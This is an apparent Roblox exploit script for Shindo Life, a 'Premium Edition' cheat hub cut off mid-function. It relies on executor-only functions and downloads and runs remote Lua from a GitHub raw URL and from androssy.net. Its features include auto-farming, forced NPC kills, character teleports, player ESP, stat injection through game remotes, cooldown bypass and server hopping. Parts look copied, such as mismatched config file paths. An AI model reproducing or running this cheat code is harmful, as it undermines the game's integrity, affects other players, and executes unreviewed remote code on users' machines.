
----------------------------------

function Script()
    local function U()
        
        if not game:IsLoaded() then
            game.Loaded:Wait()
            task.wait(10)
        end
        local c = {
            [5431069982] = "Akatsuki",
            [5431071837] = "Training",
            [4601350394] = "Sand",
            [5743370338] = "arenax",
            [5447073001] = "Forest",
            [5824792748] = "war",
            [4601350760] = "Mist",
            [4601350656] = "Cloud",
            [6341670805] = "Conquest",
            [5943872934] = "World",
            [4601350214] = "Leaf",
            [4601350809] = "Stone",
            [5451401540] = "ShindaiValley",
            [5084678830] = "Rain",
            [5451398863] = "Narumaki",
            [590798306] = "none",
            [7923764447] = "Jejunes",
            [6901575446] = "Tempest",
            [7554179068] = "gladiator",
            [5307141034] = "shindostorm",
            [6986372023] = "NewEmber",
            [4616652839] = "ShindoLife",
            [8184506020] = "Mentors",
            [6984568732] = "eventemberpain",
            [7214033433] = "forgedevent",
            [7534339269] = "shindaievent",
            [8472733618] = "kagokuevent",
            [9310522814] = "jinshikievent",
            [7524809704] = "DungeonsHub",
            [7524811367] = "dungeon1"
        }
        if not c[game.PlaceId] then
            return
        end
        local R = game:GetService("HttpService")
        local r = game:GetService("RunService")
        local k = game:GetService("Players")
        local f = k.LocalPlayer
        if not isfolder("Quiz Hub Scripts") then
            makefolder("Quiz Hub Scripts")
        end
        local H = game.PlaceId
        local I = {}
        local T = ""
        local Z = os.date("!*t").hour
        local D = false
        function TPReturner()
            local V
            if T == "" then
                V =
                    game.HttpService:JSONDecode(
                    game:HttpGet(
                        "https://games.roblox.com/v1/games/" .. H .. "/servers/Public?sortOrder=Desc&limit=100"
                    )
                )
            else
                V =
                    game.HttpService:JSONDecode(
                    game:HttpGet(
                        "https://games.roblox.com/v1/games/" ..
                            H .. "/servers/Public?sortOrder=Desc&limit=100&cursor=" .. T
                    )
                )
            end
            local q = ""
            if V.nextPageCursor and V.nextPageCursor ~= "null" and V.nextPageCursor ~= nil then
                T = V.nextPageCursor
            end
            local B = 0
            for J, x in pairs(V.data) do
                local n = true
                q = tostring(x.id)
                if tonumber(x.maxPlayers) > tonumber(x.playing) then
                    for W, Q in pairs(I) do
                        if B ~= 0 then
                            if q == tostring(Q) then
                                n = false
                            end
                        else
                            if tonumber(Z) ~= tonumber(Q) then
                                local A =
                                    pcall(
                                    function()
                                        I = {}
                                        table.insert(I, Z)
                                    end
                                )
                            end
                        end
                        B = B + 1
                    end
                    if n == true then
                        table.insert(I, q)
                        wait()
                        pcall(
                            function()
                                wait()
                                game:GetService("TeleportService"):TeleportToPlaceInstance(H, q, f)
                            end
                        )
                        wait(5)
                    end
                end
            end
        end
        if getgenv().Teleport == nil then
            getgenv().Teleport = function()
                warn("Teleporting..")
                while true do
                    wait(1)
                    pcall(
                        function()
                            TPReturner()
                            if T ~= "" then
                                TPReturner()
                            end
                        end
                    )
                end
            end
        end
        if not isfile("Quiz Hub Scripts/ShindolifeScript_" .. f.Name .. ".cfg") then
            writefile("Quiz Hub Scripts/ShindolifeScript_" .. f.Name .. ".cfg", "[]")
        end
        GetSubPrefix = function(q)
            local q = tostring(q):gsub(" ", "")
            local P = ""
            if #q == 2 then
                local B = string.sub(q, #q, #q + 1)
                P = B == "1" and "st" or B == "2" and "nd" or B == "3" and "rd" or "th"
            end
            return P
        end
        local e, g =
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ErenYeaker/SaveScript/main/LibXe.lua"))()
        local y = "%B"
        local l = os.date(" %d,", os.time())
        local o = " %Y"
        y = os.date(y, os.time()) .. l .. GetSubPrefix(l) .. os.date(o, os.time())
        local t = e:CreateWindow(("Sentinal - Premium Edition | " .. tostring(y)))
        e:Notify("Loading UI...")
        local G = {
            Load = {
                AutoLoad = {
                    Enabled = true,
                    RageSettings = false,
                    SilentLoad = false,
                    AutoLoadType = "Last Config",
                    LastUsedConfig = "",
                    LastConfig = {},
                    CustomConfig = ""
                },
                Configs = {},
                Ignored = {
                    "SettingsConfigName",
                    "SettingsConfigData",
                    "SettingsConfigConfigs",
                    "SettingsAutoLoadData",
                    "SettingsAutoLoadEnabled",
                    "SettingsAutoLoadRage",
                    "SettingsAutoLoadSilent",
                    "SettingsAutoLoadType",
                    "SettingsAutoLoadConfig"
                }
            },
            Tick = tick()
        }
        function UpdateTheme()
            e.BackgroundColor = g.SettingsMenuBackgroundColor.Value
            e.MainColor = g.SettingsMenuMainColor.Value
            e.AccentColor = g.SettingsMenuAccentColor.Value
            e.AccentColorDark = e:GetDarkerColor(e.AccentColor)
            e.InlineColor = g.SettingsMenuInlineColor.Value
            e.OutlineColor = g.SettingsMenuOutlineColor.Value
            e.FontColor = g.SettingsMenuFontColor.Value
            e:UpdateColorsUsingRegistry()
        end
        function SetDefault()
            g.SettingsMenuFontColor:SetValueRGB(Color3.fromRGB(175, 175, 175))
            g.SettingsMenuMainColor:SetValueRGB(Color3.fromRGB(30, 30, 30))
            g.SettingsMenuBackgroundColor:SetValueRGB(Color3.fromRGB(35, 35, 35))
            g.SettingsMenuAccentColor:SetValueRGB(Color3.fromRGB(203, 90, 249))
            g.SettingsMenuInlineColor:SetValueRGB(Color3.fromRGB(20, 20, 20))
            g.SettingsMenuOutlineColor:SetValueRGB(Color3.fromRGB(20, 20, 20))
            UpdateTheme()
        end
        function ResetSettings()
            for w, n in pairs(g) do
                if typeof(n.Original) ~= "nil" then
                    n:SetValue(n.Original)
                end
            end
        end
        function GetConfigNames()
            local n = {}
            for j, J in pairs(G.Load.Configs) do
                n[#n + 1] = J[1]
            end
            return n
        end
        function GetConfigByName(B)
            for P, q in pairs(G.Load.Configs) do
                if q[1] == B then
                    return q[2]
                end
            end
        end
        function CreateConfig(Q)
            if typeof(Q) == "string" then
                if (#Q > 3 and #Q <= 25) then
                    if (not GetConfigByName(Q)) then
                        G.Load.Configs[#G.Load.Configs + 1] = {Q, (e:GetConfig(G.Load.Ignored))}
                        g.SettingsConfigConfigs.Values = GetConfigNames()
                        g.SettingsConfigConfigs:SetValues()
                        g.SettingsAutoLoadConfig.Values = GetConfigNames()
                        g.SettingsAutoLoadConfig:SetValues()
                        return e:Notify(('Config "%s" Has Been Created.'):format(Q))
                    end
                    return e:Notify(('Config "%s" Already Exists.'):format(Q))
                end
                return e:Notify("Config Name Is Too Long / Short.")
            end
            return e:Notify("Config Name Is Not A String.")
        end
        function GetConfig()
            return (R:JSONEncode(e:GetConfig(G.Load.Ignored)))
        end
        function LoadConfig(V)
            if typeof(V) == "table" then
                e:SetConfig(V, G.Load.Ignored)
            elseif typeof(V) == "string" then
                local s, B =
                    pcall(
                    function()
                        V = R:JSONDecode(V)
                    end
                )
                if s then
                    e:SetConfig(V, G.Load.Ignored)
                    return e:Notify("Config Data Has Been Imported.")
                end
                return e:Notify(("Error When Loading Config Data Statement : %s."):format(B))
            end
        end
        function DeleteConfig(j)
            for w, J in pairs(G.Load.Configs) do
                if J[1] == j then
                    table.remove(G.Load.Configs, w)
                    g.SettingsConfigConfigs.Values = GetConfigNames()
                    g.SettingsConfigConfigs:SetValue(g.SettingsConfigConfigs.Value)
                    g.SettingsAutoLoadConfig.Values = GetConfigNames()
                    g.SettingsAutoLoadConfig:SetValues()
                    return e:Notify(('Config "%s" Has Been Removed.'):format(j))
                end
            end
        end
        function SaveConfig(B)
            for j, A in pairs(G.Load.Configs) do
                if A[1] == B then
                    G.Load.Configs[j] = {B, (e:GetConfig(G.Load.Ignored))}
                    return e:Notify(('Config "%s" Has Been Saved.'):format(B))
                end
            end
        end
        function ExportData()
            setclipboard(GetConfig())
            e:Notify("Config Data Has Been Exported.")
        end
        function ImportData()
            LoadConfig(g.SettingsConfigData.Value)
        end
        do
            e.SaveManager = {}
            function e.SaveManager:Save()
                G.Load.AutoLoad.LastConfig = e:GetConfig(G.Load.Ignored)
            end
            function e.SaveManager:Load()
                local q = R:JSONDecode(readfile("Xenon Hub Premium Scripts/Shindo_" .. f.Name .. ".cfg"))
                G.Load.AutoLoad = (q.AutoLoad or G.Load.AutoLoad)
                G.Load.Configs = (q.Configs or G.Load.Configs)
                do
                    g.SettingsConfigConfigs.Values = GetConfigNames()
                    g.SettingsConfigConfigs:SetValues()
                    g.SettingsAutoLoadConfig.Values = GetConfigNames()
                    g.SettingsAutoLoadConfig:SetValues()
                end
                local W
                if G.Load.AutoLoad.AutoLoadType == "Last Used Config" then
                    if GetConfigByName(G.Load.AutoLoad.LastUsedConfig) then
                        W = GetConfigByName(G.Load.AutoLoad.LastUsedConfig)
                    end
                elseif G.Load.AutoLoad.AutoLoadType == "Last Config" then
                    if G.Load.AutoLoad.LastConfig then
                        W = G.Load.AutoLoad.LastConfig
                    end
                elseif G.Load.AutoLoad.AutoLoadType == "Custom Config" then
                    if GetConfigByName(G.Load.AutoLoad.CustomConfig) then
                        W = GetConfigByName(G.Load.AutoLoad.CustomConfig)
                    end
                end
                if W then
                    if (not G.Load.RageSettings) then
                        for P, x in pairs(g) do
                            if (x.Type == "Toggle" and P:sub(1, 4) == "Rage") then
                                if W[P] then
                                    warn(("Set %s to false."):format(P))
                                    W[P] = false
                                end
                            end
                        end
                    end
                    if G.Load.AutoLoad.SilentLoad then
                        W["SettingsMenuKeybinds"] = false
                        W["SettingsMenuWatermark"] = false
                        W["SettingsMiscNotifications"] = false
                        e:SetWatermarkVisibility(false)
                        t.Holder.Visible = false
                    end
                    LoadConfig(W)
                end
            end
            function e.SaveManager:SaveFile()
                local W = R:JSONEncode({AutoLoad = G.Load.AutoLoad, Configs = G.Load.Configs})
                writefile("Quiz Hub Scripts/ShindolifeScript_" .. f.Name .. ".cfg", W)
            end
        end
        local function E()
            if
                f.Character ~= nil and f.Character:FindFirstChild("combat") and
                    f.Character.combat:FindFirstChild("mode") and
                    f.Character.combat:FindFirstChild("mode"):FindFirstChild("disable") and
                    f.Character.combat:FindFirstChild("mode"):FindFirstChild("disable").Value == false
             then
                return true
            end
            return false
        end
        local function F()
            if f.Character ~= nil and f.Character:FindFirstChild("zombify") then
                return true
            end
            return false
        end
        local b = f:GetMouse()
        local K = game:GetService("RunService").RenderStepped
        local u = Drawing.new("Triangle")
        u.Thickness = 1
        u.Filled = true
        task.spawn(
            function()
                while true do
                    if t.Holder.Visible ~= nil then
                        local P = workspace.CurrentCamera:WorldToViewportPoint(b.Hit.p)
                        u.Color = Color3.fromRGB(0, 219, 225)
                        u.PointA = Vector2.new(P.X, P.Y)
                        u.PointB = Vector2.new(P.X, P.Y) + Vector2.new(6, 14)
                        u.PointC = Vector2.new(P.X, P.Y) + Vector2.new(-6, 14)
                        u.Visible = t.Holder.Visible
                        K:Wait()
                    end
                end
            end
        )
        task.spawn(
            function()
                while true do
                    wait(1)
                    pcall(
                        function()
                            if
                                #f.PlayerGui:GetChildren() == 2 or
                                    #f.PlayerGui:GetChildren() == 3 and workspace.DistributedGameTime / 60 >= 5
                             then
                                getgenv().Teleport()
                            end
                        end
                    )
                end
            end
        )
        if game.PlaceId == 4616652839 then
            local P = t:AddTab("Home")
            local s = P:AddRightGroupbox("Teleport Options")
            local J = {
                [7524809704] = "Dungeons",
                [5431069982] = "Akatsuki",
                [5431071837] = "Training",
                [4601350394] = "Sand",
                [5447073001] = "Forest",
                [4601350760] = "Mist",
                [4601350656] = "Cloud",
                [5943872934] = "World",
                [4601350214] = "Leaf",
                [4601350809] = "Stone",
                [5451401540] = "ShindaiValley",
                [5084678830] = "Rain",
                [5451398863] = "Narumaki",
                [7923764447] = "Jejunes",
                [6901575446] = "Tempest",
                [6986372023] = "NewEmber"
            }
            for om, Xm in pairs(J) do
                s:AddButton(
                    Xm,
                    function()
                        game:GetService("TeleportService"):Teleport(om)
                    end
                )
            end
            P:ShowTab()
            local B = P:AddLeftGroupbox("Main")
            f:WaitForChild("startevent")
            f:WaitForChild("startevent")
            f:WaitForChild("statz")
            f:WaitForChild("statz"):WaitForChild("spins")
            warn(f:WaitForChild("statz"):WaitForChild("spins"))
            local V = {}
            f:WaitForChild("PlayerGui")
            f:WaitForChild("PlayerGui"):WaitForChild("Main")
            f:WaitForChild("PlayerGui"):WaitForChild("Main"):WaitForChild("Customization")
            f:WaitForChild("PlayerGui"):WaitForChild("Main"):WaitForChild("Customization"):WaitForChild("Genkaibag")
            f:WaitForChild("PlayerGui"):WaitForChild("Main"):WaitForChild("Customization"):WaitForChild("Genkaibag"):WaitForChild(
                "Frame2"
            )
            warn(
                f:WaitForChild("PlayerGui"):WaitForChild("Main"):WaitForChild("Customization"):WaitForChild(
                    "Genkaibag"
                ):WaitForChild("Frame2")
            )
            local n = f.PlayerGui.Main.Customization.Genkaibag.Frame2.BossTab
            for zX, bX in pairs(n:GetChildren()) do
                if bX:FindFirstChild("icon") and bX:FindFirstChild("name") then
                    V[bX.Name] = {Icons = bX.icon.Image, name = bX.Name, text = bX.name.Text}
                end
            end
            task.wait()
            local w = {}
            for RP, ZP in pairs(V) do
                if
                    not ZP.text:find("DUNGEON") and not ZP.text:find("BOSS") and not ZP.text:find("KENJUTSU") and
                        not f.statz.genkailevel:FindFirstChild(tostring(ZP.name))
                 then
                    w[#w + 1] = ZP.text
                end
            end
            local A = {}
            for dl, Hl in pairs(V) do
                A[Hl.text] = Hl.name
            end
            local W = {}
            for Zd, Dd in pairs(V) do
                W[Dd.name] = Dd.text
            end
            B:AddLabel("Bloodline, Spins", true)
            local x = B:AddLabel("Status : N/A", false)
            local Q = B:AddLabel("Status : N/A", false)
            B:AddLabel("", false)
            local q =
                B:AddDropdown(
                "Selected_Bloodline",
                {Text = "Select Bloodline / Elements", Multi = true, Default = 1, Values = w}
            )
            B:AddLabel("", false)
            B:AddDropdown(
                "Selected_Slots",
                {
                    Text = "Select Bloodline Slots",
                    Multi = true,
                    Default = 1,
                    Values = {"kg1", "kg2", "kg3", "kg4", "element1", "element2", "element3", "element4"}
                }
            )
            B:AddLabel("", false)
            B:AddSlider(
                "Spin_Limit",
                {Text = "Limit Spin (Leave At)", Default = 90, Min = 0, Max = 1000, Rounding = 0, Suffix = "spins"}
            )
            B:AddToggle("Auto_Spin", {Text = "Auto Spin"})
            B:AddButton(
                "Select All Bloodline",
                function()
                    g.Selected_Bloodline.Value = A
                    g.Selected_Bloodline:SetValues()
                end
            )
            B:AddButton(
                "Rejoin",
                function()
                    f:Kick("Rejoining")
                    game:GetService("TeleportService"):Teleport(game.PlaceId)
                end
            )
            f:WaitForChild("statz")
            f:WaitForChild("statz"):WaitForChild("main")
            warn(f:WaitForChild("statz"):WaitForChild("main"))
            local function j()
                for Sb, Hb in pairs(f.statz.main:GetChildren()) do
                    if
                        g.Selected_Slots.Value[tostring(Hb.Name)] and
                            g.Selected_Bloodline.Value[W[tostring(Hb.Value)]]
                     then
                        return W[tostring(Hb.Value)], Hb.Value
                    end
                end
                return false
            end
            task.spawn(
                function()
                    while true do
                        wait()
                        if g.Auto_Spin.Value then
                            pcall(
                                function()
                                    if not f:FindFirstChild("rollback") then
                                        local St = Instance.new("IntValue", f)
                                        St.Name = "rollback"
                                        f.startevent:FireServer("band", "\128")
                                    else
                                        if f.statz.spins.Value <= tonumber(g.Spin_Limit.Value) then
                                            do
                                                f:Kick(
                                                    ("no more spins left, rejoining in 3 seconds to get more spins. (refill) [%s, %s]"):format(
                                                        f.statz.spins.Value,
                                                        tonumber(g.Spin_Limit.Value)
                                                    )
                                                )
                                                game:GetService("TeleportService"):Teleport(game.PlaceId)
                                            end
                                        end
                                        for IA, dA in pairs(f.statz.main:GetChildren()) do
                                            if
                                                g.Selected_Slots.Value[tostring(dA.Name)] and
                                                    not g.Selected_Bloodline.Value[W[tostring(dA.Value)]]
                                             then
                                                x:ChangeText(
                                                    ("Spinning : %s (%s)"):format(W[tostring(dA.Value)], dA.Value)
                                                )
                                                Q:ChangeText(("Spins : %s"):format(f.statz.spins.Value))
                                                if dA:FindFirstChild("dontspin") then
                                                    game.Debris:AddItem(dA:FindFirstChild("dontspin"), 0)
                                                end
                                                if f.statz.spins.Value >= tonumber(g.Spin_Limit.Value) then
                                                    if not g.Selected_Bloodline.Value[W[tostring(dA.Value)]] then
                                                        if j() == false then
                                                            f.startevent:FireServer("spin", dA.Name)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            )
                        end
                        pcall(
                            function()
                                if j() ~= false then
                                    for V9, T9 in pairs(f.statz.main:GetChildren()) do
                                        if
                                            g.Selected_Slots.Value[tostring(T9.Name)] and
                                                g.Selected_Bloodline.Value[W[tostring(T9.Value)]]
                                         then
                                            x:ChangeText(("Achieved : %s (%s)"):format(j()))
                                            f.startevent:FireServer("band", "Eye")
                                            f.startevent:FireServer("band", "Eye")
                                            f.startevent:FireServer("band", "Eye")
                                        end
                                    end
                                end
                            end
                        )
                    end
                end
            )
        else
            local q = t:AddTab("Main")
            q:ShowTab()
            local V = q:AddLeftGroupbox("Main")
            local j = {"storymission", "dirt", "weeds", "defeat", "graffiti", "envelope", "grocerybag", "cat"}
            V:AddLabel("", false)
            V:AddDropdown("Selected_Quest", {Text = "Select Quest", Multi = true, Default = 1, Values = j})
            V:AddToggle("Auto_Kaiton", {Text = "Auto Kaitun"})
            V:AddToggle("Auto_Farm_Level", {Text = "Auto Farm Level"})
            V:AddToggle("Auto_Rank_Up", {Text = "Auto Rank Up"})
            V:AddToggle("Auto_Claim_Task", {Text = "Auto Claim Task"})
            local spizx = q:AddLeftGroupbox("Spirit")
            local w = spizx:AddLabel("Status : N/A", false)
            spizx:AddToggle("Auto_Farm_Spirit", {Text = "Auto Farm Spirit [Gen-1]"})
            spizx:AddToggle("Auto_Farm_Spirit_Hop", {Text = "Auto Farm Spirit Hop"})
            spizx:AddToggle("Auto_Mentors", {Text = "Auto Finish Mentors"})
            local function s()
                if workspace:FindFirstChild("sensei") and workspace.sensei:FindFirstChildOfClass("Folder") then
                    for EC, TC in pairs(workspace.sensei:FindFirstChildOfClass("Folder"):GetChildren()) do
                        if
                            TC:FindFirstChild("missiongiver") and
                                TC:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                                TC:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("accepted") and
                                TC:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("accepted").Value ==
                                    false
                         then
                            return TC
                        end
                    end
                end
                return nil
            end
            local J = 0
            local function A()
                if tick() >= J then
                    J = tick() + 0.01
                    f.Character.combat.update:FireServer("mouse1", true)
                    f.Character.combat.update:FireServer("mouse1", false)
                end
            end
            local x = 0
            local function B()
                if tick() >= x then
                    x = tick() + 0.1
                    f.Character.combat.update:FireServer("takemovement2")
                end
            end
            task.spawn(
                function()
                    while true do
                        wait()
                        if g.Auto_Mentors.Value then
                            pcall(
                                function()
                                    if workspace:FindFirstChild("sensei") then
                                        if tostring(f.currentmission.Value) ~= "mission" then
                                            if s() ~= nil then
                                                f.Character.HumanoidRootPart.CFrame =
                                                    s().missiongiver.HumanoidRootPart.CFrame * CFrame.new(7, 0, 0)
                                                f.startevent:FireServer("choosesensei", s())
                                                s().missiongiver.CLIENTTALK:FireServer(f)
                                            end
                                        else
                                            f.CameraMaxZoomDistance = 30
                                            local U0 = f.currentmission.Value.objective.Value
                                            if U0 == "Push-Up Training" then
                                                A()
                                            elseif U0 == "Tree-Jump Training" then
                                                B()
                                            elseif U0 == "Accuracy Training" then
                                                if workspace.Terrain[tostring(f.Name)] then
                                                    task.spawn(
                                                        function()
                                                            pcall(
                                                                function()
                                                                    workspace.CurrentCamera.CFrame =
                                                                        CFrame.new(
                                                                        workspace.CurrentCamera.CFrame.Position,
                                                                        workspace.Terrain[tostring(f.Name)].kunaiaim.Position
                                                                    )
                                                                    f.CameraMaxZoomDistance = 0
                                                                    f.CameraMaxZoomDistance = 30
                                                                    A()
                                                                end
                                                            )
                                                        end
                                                    )
                                                end
                                            elseif U0 == "Deflecting Training" then
                                                if workspace.Terrain[tostring(f.Name)] then
                                                    workspace.CurrentCamera.CFrame =
                                                        CFrame.new(
                                                        workspace.CurrentCamera.CFrame.Position,
                                                        workspace.Terrain[tostring(f.Name)].kunaiaim.Position
                                                    )
                                                    f.CameraMaxZoomDistance = 0
                                                    f.CameraMaxZoomDistance = 30
                                                end
                                            end
                                        end
                                    else
                                        if game.PlaceId == 8184506020 then
                                            for Mn, Pn in pairs(workspace.npc:GetChildren()) do
                                                if Pn:FindFirstChild("Humanoid") then
                                                    repeat
                                                        task.wait()
                                                        f.Character.HumanoidRootPart.CFrame =
                                                            Pn.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
                                                        Pn.Humanoid.Health = 0
                                                    until not Pn:FindFirstChild("Humanoid") or
                                                        not g.Auto_Mentors.Value
                                                end
                                            end
                                        end
                                    end
                                end
                            )
                        end
                    end
                end
            )
            local misczs = q:AddLeftGroupbox("Misc")
            pcall(
                function()
                    getgenv().ESP = loadstring(game:HttpGet("https://androssy.net/TrashXenon/ESP.lua"))()
                end
            )
            misczs:AddToggle("ESP_Players", {Text = "ESP Players"}):OnChanged(
                function(Vy)
                    getgenv().ESP:Toggle(Vy)
                end
            )
            misczs:AddToggle("No_Cooldown", {Text = "No Cooldown"})
            local logsf = q:AddLeftGroupbox("Logs Farm")
            logsf:AddToggle("Auto_Train_Logs", {Text = "Auto Train Logs"})
            logsf:AddToggle("Auto_Skill_Logs", {Text = "Auto Skill Logs"})
            local scrollx = q:AddLeftGroupbox("Scroll")
            scrollx:AddToggle("Auto_Collect_Scroll", {Text = "Collect Scroll", Default = true})
            scrollx:AddToggle("Ignore_Owned_Scroll", {Text = "Ignore Owned Scroll", Default = true})
            local W = game:GetService("ReplicatedStorage")
            task.spawn(
                function()
                    while true do
                        wait(1)
                        if g.Auto_Rank_Up.Value then
                            pcall(
                                function()
                                    if f.statz.lvl.lvl.Value == 1000 then
                                        local D4 = {"F", "D", "C", "B", "A", "S", "V", "X", "Y", "Z"}
                                        local Q4 = 0
                                        local R4 = 0
                                        while true do
                                            if D4[R4] == f.statz.prestige.rank.Value then
                                                Q4 = R4
                                                break
                                            end
                                            do
                                                if R4 < 10 then
                                                else
                                                    break
                                                end
                                            end
                                            R4 = R4 + 1
                                        end
                                        local k4 =
                                            tonumber(
                                            ({
                                                "5000",
                                                "5200",
                                                "5400",
                                                "5600",
                                                "5800",
                                                "6000",
                                                "6000",
                                                "6000",
                                                "6000",
                                                "6000"
                                            })[Q4]
                                        )
                                        local J4 = k4
                                        local C4 = k4
                                        local w4 = k4
                                        local T4 = k4
                                        if k4 == 6000 then
                                            if f.statz.currentsensei.Value == "Narumaki" then
                                                J4 = 7000
                                                C4 = 6800
                                                w4 = 6000
                                                T4 = 6700
                                            end
                                            if f.statz.currentsensei.Value == "Ryuji Kenichi" then
                                                J4 = 6000
                                                C4 = 6000
                                                w4 = 7000
                                                T4 = 7000
                                            end
                                            if f.statz.currentsensei.Value == "Shindai Akuma" then
                                                J4 = 6500
                                                C4 = 6500
                                                w4 = 6500
                                                T4 = 6800
                                            end
                                            if f.statz.currentsensei.Value == "Jiso Seishin" then
                                                J4 = 6000
                                                C4 = 6500
                                                w4 = 6000
                                                T4 = 7500
                                            end
                                        end
                                        if J4 >= 6000 then
                                            f.startevent:FireServer("maxlvlpres")
                                        else
                                            f.startevent:FireServer("rankup")
                                        end
                                    end
                                end
                            )
                        end
                    end
                end
            )
            task.spawn(
                function()
                    while true do
                        wait(1)
                        if g.Auto_Claim_Task.Value then
                            pcall(
                                function()
                                    for BC, sC in pairs(f.statz.mission:GetChildren()) do
                                        if
                                            sC:FindFirstChild("amount") and sC:FindFirstChild("maxamount") and
                                                sC:FindFirstChild("amount").Value ==
                                                    sC:FindFirstChild("maxamount").Value
                                         then
                                            f.startevent:FireServer("claim", sC)
                                        end
                                    end
                                end
                            )
                        end
                        if g.No_Cooldown.Value then
                            pcall(
                                function()
                                    W:WaitForChild("statz")
                                    W:WaitForChild("statz"):WaitForChild("spiritcolor")
                                    f:WaitForChild("statz")
                                    if
                                        game.ReplicatedStorage:FindFirstChild("alljutsu") and
                                            game.ReplicatedStorage:FindFirstChild("alljutsu"):WaitForChild(
                                                "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                            ) and
                                            f:FindFirstChild("statz") and
                                            f:FindFirstChild("statz"):FindFirstChild("keys") and
                                            game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                f.statz.keys.z.Value
                                            )
                                     then
                                        f.startevent:FireServer("addstat", "ninjutsu", 100)
                                        if F() == false and E() == true then
                                            if f.Character ~= nil and not f.Character:FindFirstChild("zombify") then
                                                if not f.Character:FindFirstChild("bodyeffect") then
                                                    f.Character.combat.update:FireServer("key", "z")
                                                end
                                                workspace.VC.RemoteEvent:FireServer("!spirit")
                                            else
                                                workspace.Camera.CameraSubject = f.Character
                                            end
                                        end
                                        if f.PlayerGui.Main.ingame.chat.Visible then
                                            f.PlayerGui.Main.ingame.chat.Visible = false
                                        else
                                            if f.Character:FindFirstChild("beserk") then
                                                f.Character:FindFirstChild("beserk"):Destroy()
                                            else
                                                if f.PlayerGui:FindFirstChild("Main"):FindFirstChild("Frame") then
                                                    f.PlayerGui:FindFirstChild("Main"):FindFirstChild("Frame"):Destroy(

                                                    )
                                                end
                                            end
                                        end
                                    end
                                end
                            )
                        end
                        if g.Auto_Kaiton.Value and workspace.DistributedGameTime / 60 >= 5 then
                            getgenv().Teleport()
                        end
                    end
                end
            )
            local P
            local n
            local Q = {}
            local RU = {7524809704, 7524811367}
            if table.find(RU, game.PlaceId) then
                local Dw = q:AddRightGroupbox("Dungeons - Farm")
                Dw:AddLabel("Dungeons - Status", true)
                local pw = Dw:AddLabel("Round : 0", false)
                local Hw = Dw:AddLabel("Enemies Left : 0", false)
                Dw:AddLabel("Dungeons - Settings", true)
                local ww = {}
                for Ee = 1, 15 do
                    table.insert(ww, "dungeon" .. Ee)
                end
                local ow = 0
                local function tw()
                    if tick() >= ow then
                        ow = tick() + 0.01
                        f.Character.combat.update:FireServer("key", "e")
                        f.Character.combat.update:FireServer("key", "eend")
                    end
                end
                Dw:AddDropdown("Dungeon_Level", {Text = "Select Dungeons Level", Default = 1, Values = ww})
                Dw:AddDropdown(
                    "Dungeon_Type",
                    {Text = "Dungeon Type", Default = 1, Values = {"easy", "medium", "hard"}}
                )
                Dw:AddToggle("Auto_Farm_Dungeons", {Text = "Auto Farm Dungeons"})
                task.spawn(
                    function()
                        while true do
                            task.wait()
                            pcall(
                                function()
                                    if workspace:FindFirstChild("warserver") then
                                        pw:ChangeText("Round : " .. workspace.warserver.round.Value)
                                        Hw:ChangeText("Enemies Left : " .. workspace.warserver.zetsu.Value)
                                    end
                                end
                            )
                            if g.Auto_Farm_Dungeons.Value then
                                pcall(
                                    function()
                                        if workspace:FindFirstChild("warserver") then
                                            if
                                                workspace.warserver.round.Value == -1 and
                                                    workspace.warserver.isdone.Value == false and
                                                    workspace.warserver.zetsu.Value == 0
                                             then
                                                game:GetService("TeleportService"):Teleport(7524809704)
                                            else
                                                if workspace.warserver.zetsu.Value ~= 0 then
                                                    if sethiddenproperty then
                                                        sethiddenproperty(f, "SimulationRadius", 60000)
                                                        sethiddenproperty(f, "MaximumSimulationRadius", 9.0E9)
                                                    end
                                                    if setscriptable then
                                                        setscriptable(f, "SimulationRadius", true)
                                                        setscriptable(f, "MaximumSimulationRadius", true)
                                                        f.SimulationRadius = 60000
                                                        f.MaximumSimulationRadius = 9.0E9
                                                    end
                                                    if game.PlaceId == 7524811367 then
                                                        for Br, kr in pairs(workspace.npc:GetChildren()) do
                                                            if kr:FindFirstChild("Humanoid") then
                                                                if
                                                                    game.ReplicatedStorage:FindFirstChild(
                                                                        "alljutsu"
                                                                    ) and
                                                                        game.ReplicatedStorage:FindFirstChild(
                                                                            "alljutsu"
                                                                        ):WaitForChild(
                                                                            "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                                        ) and
                                                                        f:FindFirstChild("statz") and
                                                                        f:FindFirstChild("statz"):FindFirstChild(
                                                                            "keys"
                                                                        ) and
                                                                        game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                                            f.statz.keys.z.Value
                                                                        )
                                                                 then
                                                                    f.startevent:FireServer(
                                                                        "addstat",
                                                                        "ninjutsu",
                                                                        100
                                                                    )
                                                                    if F() == false and E() == true then
                                                                        if
                                                                            f.Character ~= nil and
                                                                                not f.Character:FindFirstChild(
                                                                                    "zombify"
                                                                                )
                                                                         then
                                                                            if
                                                                                not f.Character:FindFirstChild(
                                                                                    "bodyeffect"
                                                                                )
                                                                             then
                                                                                f.Character.combat.update:FireServer(
                                                                                    "key",
                                                                                    "z"
                                                                                )
                                                                            end
                                                                            workspace.VC.RemoteEvent:FireServer(
                                                                                "!spirit"
                                                                            )
                                                                        else
                                                                            workspace.Camera.CameraSubject =
                                                                                f.Character
                                                                        end
                                                                    else
                                                                        workspace.Camera.CameraSubject = f.Character
                                                                        f.Character.HumanoidRootPart.CFrame =
                                                                            kr.HumanoidRootPart.CFrame *
                                                                            CFrame.new(0, 40, 5)
                                                                        workspace.CurrentCamera.CFrame =
                                                                            CFrame.new(
                                                                            workspace.CurrentCamera.CFrame.Position,
                                                                            kr.HumanoidRootPart.Position
                                                                        )
                                                                        f.CameraMaxZoomDistance = 0
                                                                        f.CameraMaxZoomDistance = 30
                                                                        if kr:FindFirstChild("HumanoidRootPart") then
                                                                            f.startevent:FireServer(
                                                                                "target",
                                                                                kr:FindFirstChild(
                                                                                    "HumanoidRootPart"
                                                                                )
                                                                            )
                                                                        end
                                                                        tw()
                                                                    end
                                                                    if f.PlayerGui.Main.ingame.chat.Visible then
                                                                        f.PlayerGui.Main.ingame.chat.Visible = false
                                                                    else
                                                                        if f.Character:FindFirstChild("beserk") then
